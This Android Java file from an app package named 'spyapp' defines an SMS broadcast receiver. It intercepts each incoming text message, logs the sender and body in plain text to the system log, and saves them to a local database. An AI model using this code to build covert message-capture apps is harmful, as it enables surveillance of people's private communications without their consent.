package com.example.spyapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSListener extends BroadcastReceiver{
	static final String TAG="SMSListener:";

	@Override
	 public void onReceive(Context context, Intent intent)
    { 
		Log.d("SMSListener","OnReceive-start");
        Bundle myBundle = intent.getExtras();
        DatabaseHandler databasehandler1 = new DatabaseHandler(context);
        MessageRetreiverService msg1 = new MessageRetreiverService();
        SmsMessage [] messages = null;
    	String[][] dbentries = new String[1000][150];
        String strMessage = "";
        long TIMESTAMP;
        String SENDER;
        String RECEIVER;
        String BODY;

        if (myBundle != null)
        {
            Object [] pdus = (Object[]) myBundle.get("pdus");
            messages = new SmsMessage[pdus.length];

            for (int i = 0; i < messages.length; i++)
            {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                strMessage += "SMS From: " + messages[i].getOriginatingAddress();
                strMessage += " : ";
                strMessage += messages[i].getMessageBody();
                strMessage += "\n";
                
                TIMESTAMP=messages[i].getTimestampMillis();
                SENDER=messages[i].getOriginatingAddress();
                RECEIVER="SELF";
                BODY=messages[i].getMessageBody(); 
                String timestamp_str=Long.toString(TIMESTAMP);
                Log.d(TAG,"TIMESTAMP:"+timestamp_str);
                Log.d(TAG,"SENDER"+SENDER);
                Log.d(TAG,"RECEIVER"+RECEIVER);
                Log.d(TAG,"BODY"+BODY);
     		    databasehandler1.insertmsgintodb(TIMESTAMP, SENDER, RECEIVER, BODY,1,0);
                dbentries=databasehandler1.getAllvalues();
       //       msg1.insertMSGIntoDB(TIMESTAMP, SENDER, RECEIVER, BODY);
                
            }
//Log.d("SMSListener",strMessage);
      //      Toast.makeText(context, strMessage, Toast.LENGTH_SHORT).show();
        }
    }

}
